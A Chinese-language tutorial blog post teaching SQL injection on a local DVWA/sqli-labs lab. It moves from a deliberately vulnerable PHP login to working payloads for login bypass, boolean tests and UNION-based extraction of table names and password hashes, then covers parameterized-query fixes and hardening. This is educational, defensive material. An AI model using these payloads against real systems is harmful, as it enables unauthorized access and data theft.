从登录框开始：SQL 注入的第一课（授权靶场）

为什么一个单引号能让页面报错？从 HTTP 请求到后端拼接，把注入的原理、验证手法和修复方式一次讲清楚。

OOcean · 2026-11-11 · 约 14 分钟

实验环境声明

本文所有操作都在本机 Docker 里的 DVWA / sqli-labs 完成，访问地址是 127.0.0.1。 这些手法只在这类自建或明确授权的环境中使用；对任何未授权的系统使用，都属于违法行为。

SQL 注入是 Web 安全里最经典的一类漏洞，也是我第一个真正「想明白」的漏洞。 想明白的那一刻不是记住了某个 payload，而是意识到一件事： 后端把你的输入，当成了代码的一部分。

一、登录框背后发生了什么

在浏览器里填完账号密码点「登录」，实际上发生了三件事。

1. 浏览器发了一个 POST 请求

httpPOST /login.php HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=admin&password=123456

2. 后端把这两个值拼进 SQL

教科书式的脆弱写法长这样（PHP 示例）：

php<?php
// 危险示范：直接把用户输入拼进 SQL 语句
$user = $_POST['username'];
$pass = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$res = mysqli_query($conn, $sql);

if (mysqli_num_rows($res) > 0) {
    echo "登录成功";
}
?>

当输入是 admin / 123456 时，拼出来的语句是：

sqlSELECT * FROM users WHERE username = 'admin' AND password = '123456'

到这里一切正常。问题出在：用户填的内容，和 SQL 的语法，被放进了同一个字符串里。

3. 数据库执行这条语句

数据库并不知道哪部分是「程序写的」、哪部分是「用户填的」。它只看到一个完整的 SQL 语句，然后照做。

二、第一刀：一个单引号

在用户名里只输入一个单引号：

textusername = '

拼出来的语句变成：

sqlSELECT * FROM users WHERE username = ''' AND password = ''

''' 在 SQL 里是语法错误——单引号没闭合。于是页面报错，典型信息是 You have an error in your SQL syntax，有的程序甚至会把整条语句回显在页面上。

这一步的价值不是「注进去了」，而是确认了输入确实进了 SQL 的语法位置。这是后面所有尝试的前提。

顺带一个防御点

生产环境把数据库错误直接显示给用户，本身就是信息泄露。关掉 display_errors、统一错误页，能让攻击者少拿到很多线索。

三、为什么注释能救命

既然单引号会破坏语法，那就想办法把后面剩下的部分注释掉，让语句重新变成一个合法结构。 MySQL 里常用的注释有三种，细节差别值得记住：

注释写法要求在 URL 里怎么传
-- （两个减号 + 空格）后面必须有空格，否则不成立--+（+ 解码为空格）或 --%20
#直接注释到行尾%23，# 在 URL 里是锚点，必须编码
/* */块注释，可跨行/**/

经典的第一条 payload 是这么来的：

text用户名: admin' -- 
密码:   随便填

拼进 SQL 后：

sqlSELECT * FROM users WHERE username = 'admin' -- ' AND password = ''

-- 之后全部被注释掉，条件只剩 username = 'admin'。 密码校验被整段删掉了——这就是为什么它能绕过登录。

注意那个空格：我一开始就卡在这儿，把 -- 直接写进输入框，一直不成功，后来才发现 MySQL 的 -- 必须跟一个空格或控制字符才算注释。

四、布尔判断：让数据库回答「是 / 否」

如果页面不报错、也不回显，那就换思路：把注入点变成一个可以提问的条件。

sql-- 永远为真：返回所有用户，登录成功
username = ' OR '1'='1' -- 

-- 永远为假：返回空，登录失败
username = ' OR '1'='2' --

这两条的结果一个成功一个失败，就说明这个点可以用来提问。 后面的盲注就是把这个能力用到底：把问题换成「数据库名的第一个字母是不是 a」， 根据页面反应的不同逐位猜出内容。慢，但有效。

五、联合查询：把别的表读出来

如果页面会把查询结果回显出来（比如显示「欢迎你，xxx」），就可以用 UNION 把另一条查询的结果拼到同一张结果表里。

第一步：确定列数

sql1' ORDER BY 1-- 
1' ORDER BY 2-- 
1' ORDER BY 3-- 
-- 一直加，直到页面报错，说明列数比这个数字少

假设 ORDER BY 3 报错、ORDER BY 2 正常，说明原查询是 2 列。

第二步：找到回显位置

sql1' UNION SELECT 1,2--

页面显示 1 和 2 的位置，就是可以「放东西」的位置。把数字换成函数：

sql1' UNION SELECT database(), user()--

会回显当前数据库名和数据库用户。接着就能读表名、列名、数据：

sql-- 列出当前库的所有表
1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- 

-- 假设上一步读到 users 表，列出它的列
1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- 

-- 取出账号和密码哈希
1' UNION SELECT user,password FROM users--

两个小细节

① UNION 要求两边列数相同，还能靠类型报错判断哪一列是数字、哪一列是字符串。② 有的页面只显示第一行结果，这时用 LIMIT 0,1 或 group_concat() 把多行拼成一行。

六、为什么会这样：拼接与参数化

回到根因。脆弱写法的问题不在于「没有过滤单引号」，而在于数据被当成了语法。

参数化查询（预处理语句）解决的正是这一点：先把 SQL 的结构发给数据库编译好，再把用户数据作为纯值填进占位符。数据里就算有单引号、有 UNION，也只会被当作一个普通字符串。

PHP（PDO）

php// 正确做法一：具名占位符
$stmt = $pdo->prepare(
    'SELECT id, username, password_hash FROM users WHERE username = :name'
);
$stmt->execute([':name' => $user]);

$row = $stmt->fetch();
// 密码不参与 SQL 比较，取出来用 password_verify 校验
if ($row && password_verify($pass, $row['password_hash'])) {
    // 登录成功
}

Python（psycopg2 / sqlite3）

python# 正确做法：参数用元组传入，不要自己拼接字符串
cur.execute(
    "SELECT id, pwd_hash FROM users WHERE username = %s",
    (username,)
)
row = cur.fetchone()

Go（database/sql）

gorow := db.QueryRow("SELECT id, pwd_hash FROM users WHERE username = ?", username)

七、修复清单

只改一行代码是不够的，完整一点应该这样：

  1. 参数化查询：所有带用户输入的地方都用占位符，包括排序字段——如果排序只能选字段名，就用白名单映射，不要直接拼。
  2. 口令哈希存储：用 password_hash() / bcrypt / argon2，登录时用对应的 verify，不要在 SQL 里比明文。
  3. 最小权限的数据库账户：Web 应用用的账号通常只需要 SELECT/INSERT/UPDATE 某几个库，不要用 root，更不要给 FILE 权限。
  4. 关闭详细报错：对外统一错误页，详细堆栈只写日志。
  5. 输入校验是辅助手段：限制长度、类型能降低风险，但不能替代参数化——转义函数在数字型注入面前是无效的。
  6. 纵深防御：WAF、RASP、异常查询告警、日志留存。WAF 只能挡住已知特征，绕过手法一直在更新，它永远只是兜底。

八、注入到底能造成多大影响

新手容易把注入理解成「绕过登录」，实际上它意味着数据库里能执行什么，你就能做什么：

  • 读取业务库里的全量数据（用户表、订单表）；
  • 篡改、删除数据，造成业务不可用；
  • 在数据库权限允许时读写服务器文件；
  • 与其他问题组合：拿到密码哈希 → 撞库或离线破解 → 登录后台 → 再找上传点，整条链路就通了；
  • 在极端配置下（高权限数据库账户、可写目录），理论上可以进一步影响到操作系统层。

这也是为什么在报告里，SQL 注入通常被定为高危：它的影响面取决于权限，而不是漏洞本身。

九、我的复盘清单

以后遇到任何输入点，都按这五步走一遍：

  • 这个参数最终去哪了？SQL、命令、文件路径、模板、还是 HTTP 请求？
  • 它进入的位置是「值」还是「语法」？
  • 如果它进了语法，破坏结构会有什么可见反应（报错 / 结果变化 / 时间延迟）？
  • 能否用不同类型的问题确认：布尔、联合、时间、报错？
  • 修复方案是不是参数化？如果不是，为什么？

下一篇打算写 XSS，把「输入被当成代码」这件事换到浏览器里再讲一遍。你会发现这两类漏洞的思维模型，其实是同一个。
